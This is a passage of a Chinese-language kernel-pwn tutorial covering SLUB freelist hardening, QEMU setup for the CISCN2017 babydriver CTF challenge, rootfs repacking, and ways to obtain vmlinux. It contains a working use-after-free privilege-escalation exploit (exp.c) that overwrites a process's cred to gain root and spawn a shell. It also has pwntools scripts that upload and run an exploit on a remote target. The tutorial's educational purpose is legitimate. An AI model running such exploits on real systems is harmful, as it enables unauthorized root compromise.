的地址不能一样，这和 glibc 类似。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object, <span class="type">void</span> *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 接着是
<code>freelist_ptr</code> ，它会返回当前 object 的下一个 free object
的地址， 加上 hardened 之后会和之前初始化的 random 值做异或。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">freelist_ptr</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *ptr,</span></span><br><span class="line"><span class="params">				 <span class="type">unsigned</span> <span class="type">long</span> ptr_addr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">			(<span class="type">unsigned</span> <span class="type">long</span>)kasan_reset_tag((<span class="type">void</span> *)ptr_addr));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> #### SLAB_FREELIST_RANDOM
<code>CONFIG_SLAB_FREELIST_RANDOM=y</code> 编译选项开启 Random freelist
保护。 这种保护主要发生在 slub allocator 向 buddy system
申请到页框之后的处理过程中，对于未开启这种保护的一张完整的 slub，其上的
object 的连接顺序是线性连续的，但在开启了这种保护之后其上的 object
之间的连接顺序是随机的，这让攻击者无法直接预测下一个分配的 object
的地址</p>
<p>需要注意的是这种保护发生在slub allocator 刚从 buddy system 拿到新
slub 的时候，运行时 freelist 的构成仍遵循 LIFO <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c81b7db51c45c08b72566e44bb812f6e.png"
                      alt="image.png" 
                >
#### INIT_ON_ALLOC_DEFAULT_ON
当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy
system 和 slab
allocator），会将被分配的内存上的内容进行清零，从而防止了利用未初始化内存进行数据泄露的情况。
# 环境搭建 这里以 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/ciscn2017_babydriver" >CISCN2017
- babydriver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例讲解一下 kernel pwn 环境搭建。 ## 基础概念
将下载好附件解压后发现三个文件： - <code>boot.sh</code>：启动脚本 -
<code>bzImage</code>：内核镜像 - <code>rootfs.cpio</code>：文件系统 ###
启动脚本 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> \</span><br><span class="line">  -enable-kvm \</span><br><span class="line">  -monitor /dev/null -m 64M \</span><br><span class="line">  --nographic \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -cpu kvm64,+smep</span><br></pre></td></tr></table></figure></div> 在用 qemu 启动内核时，常用的选项如下</p>
<ul>
<li>-m， 指定 RAM 大小，默认 384M</li>
<li>-kernel，指定内核镜像文件 bzImage 路径</li>
<li>-initrd，设置内核启动的内存文件系统</li>
<li>-smp
[cpus=]n[,cores=cores][,threads=threads][,dies=dies][,sockets=sockets][,maxcpus=maxcpus]，指定使用到的核数。</li>
<li>-cpu，指定指定要模拟的处理器架构，可以同时开启一些保护，如
<ul>
<li>+smap，开启 smap 保护</li>
<li>+smep，开启 smep 保护</li>
</ul></li>
<li>-nographic，表示不需要图形界面</li>
<li>-monitor，对 qemu
提供的控制台进行重定向，如果没有设置的话，可以直接进入控制台。<code>-monitor /dev/null</code>
后 <code>Ctrl + c</code> 可以直接退出 qemu 。</li>
<li>-append，附加选项
<ul>
<li>nokaslr 关闭随机偏移</li>
<li>pti=on/off 开启/关闭 KPTI</li>
<li>console=ttyS0，和 nographic
一起使用，启动的界面就变成了当前终端。</li>
</ul></li>
</ul>
<p>安装 qemu 后运行 <code>boot.sh</code> 即可启动 linux 系统。 ###
内核镜像 - <strong>vmlinux：原始内核文件</strong> - 在当前目录下提取到
<code>vmlinux</code> ，为编译出来的原始内核文件。 -
<strong>bzImage：压缩内核镜像</strong> - 在当前目录下的
<code>arch/x86/boot/</code> 目录下提取到 <code>bzImage</code>
，为压缩后的内核文件，适用于大内核。 - <strong>zImage &amp;&amp;
bzImage</strong> - zImage 是 vmlinux 经过gzip压缩后的文件。 - bzImage
中的 bz 表示“big zImage”。bzImage 不是用 bzip2
压缩，而是要偏移到一个位置，使用 gzip 压缩。 -
两者的不同之处在于，zImage 解压缩内核到低端内存(第一个 640K)，bzImage
解压缩内核到高端内存(1M 以上)。如果内核比较小，那么采用 zImage 或
bzImage 都行，如果比较大应该用 bzImage 。</p>
<h3 id="文件系统">文件系统</h3>
<p>启动的文件系统，可以通过 <code>cpio</code>
进行解压（<code>cpio -idmv &lt; rootfs.cpio</code>），不过有的题目可能会把一些其它压缩格式的文件系统后缀改成
<code>cpio</code> （例如这道 babydriver
例题就是？？）<del>所以最好直接右键 + <code>Extract Here</code>
解压</del> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/44e4ba509ee764b224d3f4e294593b5e.png"
                     
alt="在这里插入图片描述" 
                >
有时右键解压的文件系统会导致内核启动不了，目前用 <code>binwalk -e</code>
解压的是没问题的 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/024e56ed9b1dc15af106c1862c351ea6.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>将 <code>rootfs</code> 解压后可以看到在其根目录下有 <code>init</code>
文件，内容如下： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure></div> <code>init</code> 是 linux
启动时的初始化文件，主要做一些环境配置。通过分析 <code>init</code>
文件可以获取一些重要信息，另外可以通过修改 <code>init</code>
文件增加调试分析的便捷性。 - 从 <code>init</code> 脚本中得知
需要分析的驱动文件的所在路径为
<code>/lib/modules/4.4.72/babydriver.ko</code> ，另外该驱动可能对应设备
<code>/dev/babydev</code> ，具体是否存在这种对应关系还需要分析
<code>babydriver.ko</code> 中是否有注册 <code>babydev</code>
设备的操作。 - <code>setsid cttyhack setuidgid 1000 sh</code>
这条命令决定以非 root 权限启动命令行，如果想要以 root
权限启动命令行需要将 1000 改为 0 。 - 有的题目可能存在
<code>poweroff -d 120 -f &amp;</code>
命令用来定时关机，在本地调试的时候最好注释掉。 ## 打包文件系统
本地调试的时候需要多次修改 <code>exp</code> 以及 <code>init</code>
，因此为了方便最好还是选择打包文件系统，而不是上传文件。注意这里的
<code>rootfs</code> 是手动从 <code>rootfs.cpio</code> 中解压出来的。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cp -r rootfs rootfs_tmp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">musl-gcc -static -masm=intel -pthread exp.c -o exp</span></span><br><span class="line">gcc -static -masm=intel -pthread exp.c -o exp</span><br><span class="line">cp exp rootfs_tmp/</span><br><span class="line"></span><br><span class="line">cd rootfs_tmp || exit</span><br><span class="line">find . | cpio -o -H newc &gt;../rootfs.cpio</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">sudo rm -rf rootfs_tmp</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>exp.c</code> 文件内容如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 打开两次设备</span></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">    <span class="comment">// 释放 fd1</span></span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fork error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="type">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 如果
<code>gcc</code> 编译的 <code>exp</code> 过大可以考虑使用
<code>musl-gcc</code> 进行编译，不过例如 <code>userfault_fd</code>
的相关功能 <code>musl</code> 没有，并不能完全替代 gcc 。</p>
<p><code>musl-gcc</code> 的具体安装方式可以参考<a class="link" 
 href="https://sky123.blog.csdn.net/article/details/129800670" >这篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的环境搭建里面的编译脚本，编译完成之后
<code>musl-gcc</code> 就在安装目录下的 <code>bin</code>
目录下，添加环境变量即可使用。</p>
<p>另外题目附件中没有 flag 文件，可以手动在 <code>rootfs</code>
目录下创建一个 <code>flag</code> 文件用于测试。</p>
<p>运行 <code>pack.sh</code> 和 <code>boot.sh</code> 可以看到
<code>exp</code> 已经打包到文件系统中，运行 <code>exp</code> 成功提权。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fe05c4c5fd5262c0b74c90913c6ce22c.png"
                     
alt="在这里插入图片描述" 
                > ## 文件远程传输方式
目前来说比较通用的办法便是将 exploit 进行 base64 编码后传输</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">11451</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./run.sh&#x27;)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        log.info(<span class="string">&quot;count: &quot;</span> + <span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.sendline(<span class="string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x /tmp/exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;/tmp/exploit &quot;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, os</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./boot.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 5555)</span></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;tar -czvf exp.tar.gz ./exploit&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./b64_exp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;echo &#x27;&#x27; &gt; b64_exp;&quot;</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;now line: &#x27;</span> + <span class="built_in">str</span>(count))</span><br><span class="line">    line = f.readline().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line)&lt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cmd = <span class="string">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class="string">b&quot;&#x27; &gt;&gt; b64_exp;&quot;</span></span><br><span class="line">    p.sendline(cmd) <span class="comment"># send lines</span></span><br><span class="line">    <span class="comment">#time.sleep(0.02)</span></span><br><span class="line">    <span class="comment">#p.recv()</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;base64 -d b64_exp &gt; exp.tar.gz;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;tar -xzvf exp.tar.gz&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;chmod +x ./exploit;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;./exploit&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="获取-vmlinux">获取 vmlinux</h2>
<p>由于 bzImage 是压缩过的内核镜像，因此需要获取未经压缩的
<code>vmlinux</code> 镜像用于提供调试符号，以及查找 gadget
和关键结构偏移。</p>
<p>下面提供几个获取 vmlinux 的方法。 ### 编译内核
<strong>注意，即使题目提供了 config 文件，编译出的 vmlinux
中各结构的偏移也不一定与题目提供的 bzImage 相同。编译出的 vmlinux
只是在计算结构体中成员偏移起参考作用，gadget 等涉及在内核中偏移的还是在
vmlinux-to-elf 解压的 vmlinux 中找。</strong> <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f2f96c222f1119bae1840b4b1ff095bf.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>编译内核的好处是可以配置编译文件，并且可以编译出带调试符号的文件，gdb
调试的时候可以查看源码。 为了方便调试，需要从这个<a class="link" 
 href="https://mirrors.tuna.tsinghua.edu.cn/kernel/" >网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载与题目所给内核版本相同的内核源码并编译出带调试符号的内核文件。</p>
<p>首先查看题目所给内核版本 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c93f022e123582a73f61518d69b88fa2.png"
                     
alt="在这里插入图片描述" 
                > 下载对应版本内核并解压 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/51cb330151299d66bf3881b7aa81cc54.png"
                     
alt="在这里插入图片描述" 
                > 查看题目所给内核编译时使用的 gcc 版本 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4474952c80dbb804309d2bc6a50287e4.png"
                     
alt="在这里插入图片描述" 
                > <strong>由于编译该内核的所需的 gcc-5
已经无法在 ubuntu 18.04 及以上版本系统中下载安装，因此编译该内核需要再
ubuntu 16.04 中进行。</strong> 下面的图中的操作之所以是在高版本 ubuntu
中进行是因为当时是可以的。</p>
<p>输入命令，查看 gcc-5 可选的版本 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt-cache policy gcc-5</span><br></pre></td></tr></table></figure></div> 找到了与编译题目内核的
gcc 比较接近的版本（这里我已经安装过了） <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/45da6ddd31759a9cc29edb9e1fc2c575.png"
                     
alt="在这里插入图片描述" 
                > 安装</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gcc-5=5.4.0-6ubuntu1~16.04.12</span><br></pre></td></tr></table></figure></div>
<p>更新到 update-alternatives 上（参考<a class="link" 
 href="https://sky123.blog.csdn.net/article/details/124440184" >编译
ollvm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 时 gcc 版本的设置）</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 5</span><br></pre></td></tr></table></figure></div>
<p>切换到 gcc-5 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f0b1c1b6aadf1eba53a3755458240f63.png"
                     
alt="在这里插入图片描述" 
                > <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8032fcd09424f9f59736d97d9f23de25.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>之后编辑配置文件，在 linux-4.4.72 目录下输入</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>
<p>保证勾选如下配置（默认都是勾选了的）：</p>
<ul>
<li>Kernel hacking —&gt; Kernel debugging</li>
<li>Kernel hacking —&gt; Compile-time checks and compiler options —&gt;
Compile the kernel with debug info</li>
<li>Kernel hacking —&gt; Generic Kernel Debugging Instruments –&gt;
KGDB: kernel debugger</li>
<li>kernel hacking —&gt; Compile the kernel with frame pointers</li>
</ul>
<p>一般来说不需要有什么改动，直接保存退出即可。</p>
<p>设置保存在 <code>.config</code> 文件中。 为了防止后面编译报下面这个错
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">make[1]: *** No rule to make target &#x27;debian/canonical-certs.pem&#x27;, needed by &#x27;certs/x509_certificate_list&#x27;.  Stop.</span><br><span class="line">make: *** [Makefile:1868: certs] Error 2</span><br></pre></td></tr></table></figure></div> 需要编辑 <code>.config</code>
文件，直接把下面这个字符串删掉。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0e45c44c3822f545cfa2067a616acf76.png"
                     
alt="在这里插入图片描述" 
                >
之后编译可能还会缺少一些依赖，为了尽可能一次成功，先把下面这些装一下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install flex</span><br><span class="line">sudo apt install bison</span><br><span class="line">sudo apt install libelf-dev </span><br><span class="line">sudo apt install libssl-dev</span><br><span class="line">sudo apt install dwarves</span><br><span class="line">sudo apt install zstd</span><br></pre></td></tr></table></figure></div>
<p>之后运行下面这条命令进行编译 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">make bzImage -j4</span><br></pre></td></tr></table></figure></div> 最后生成的 vmlinux 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/638d83d2f81585a9fec3f2f9c2e655d8.png"
                     
alt="在这里插入图片描述" 
                > ### vmlinux-to-elf 此工具允许从
vmlinux/vmlinuz/bzImage/zImage 内核映像获取完全可分析的 .ELF
文件，其中包含恢复的函数和变量符号。</p>
<p>安装： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df</span><br><span class="line">sudo pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure></div> 使用方法： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span><br></pre></td></tr></table></figure></div>
与后面两个方法相比，这个方法获取的 vmlinux
带调试符号，不过结构体相关的调试符号只有编译内核可以获得。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a4a9e1beefc8b080d8988819ab67e61a.png"
                     
alt="在这里插入图片描述" 
                > ### 下载镜像
有的内核题可以直接下载下载现有镜像 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d344b50a2b60fe8ed41cfd6e05923cd0.png"
                     
alt="在这里插入图片描述" 
                > 使用如下命令列出可下载内核镜像</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt search linux-image-</span><br></pre></td></tr></table></figure></div>
<p>找到对应版本 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/597ff6c86dbd147d99dcb311abf66cee.png"
                     
alt="在这里插入图片描述" 
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt download linux-image-unsigned-5.8.0-59-generic</span><br></pre></td></tr></table></figure></div>
<p>下载下来是一个<code>deb</code>文件，解压有</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg -X ./linux-image-unsigned-5.8.0-59-generic_5.8.0-59.66~20.04.1_amd64.deb extract</span><br></pre></td></tr></table></figure></div>
<p>文件如下 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree</span></span><br><span class="line">.</span><br><span class="line">├── boot</span><br><span class="line">│   └── vmlinuz-5.8.0-59-generic</span><br><span class="line">└── usr</span><br><span class="line">    ├── lib</span><br><span class="line">    │   └── linux</span><br><span class="line">    │       └── triggers</span><br><span class="line">    └── share</span><br><span class="line">        └── doc</span><br><span class="line">            └── linux-image-unsigned-5.8.0-59-generic</span><br><span class="line">                ├── changelog.Debian.gz</span><br><span class="line">                └── copyright</span><br><span class="line"></span><br><span class="line">8 directories, 3 files</span><br></pre></td></tr></table></figure></div> 其中 <code>vmlinuz-5.8.0-59-generic</code>
是压缩版的镜像，需要解压出 vmlinux 。 首先获取 <code>1f 8b 08 00</code>
的偏移： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">od -t x1 -A d vmlinuz-5.8.0-59-generic | grep &quot;1f 8b 08 00&quot;</span><br></pre></td></tr></table></figure></div> 解压，其中 skip 的值为 <code>1f 8b 08 00</code>
的偏移。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dd if=vmlinuz-5.8.0-59-generic bs=1 skip=16808|zcat&gt;vmlinux</span><br></pre></td></tr></table></figure></div> ### bzImage 解压 使用 <a class="link" 
 href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" >extract-vmlinux <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
脚本从 bzImage 获取 vmlinux 。 脚本不长，直接在下面贴一下。
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">----------------------------------------------------------------------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Inspired from extract-ikconfig</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># ----------------------------------------------------------------------</span></span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Use readelf to check <span class="keyword">if</span> it<span class="string">&#x27;s a valid ELF</span></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash"><span class="string">TODO: find a better to way to check that it&#x27;</span>s really vmlinux</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">      and not just an elf</span></span><br><span class="line">	readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1</span><br><span class="line"></span><br><span class="line">	cat $1</span><br><span class="line">	exit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta 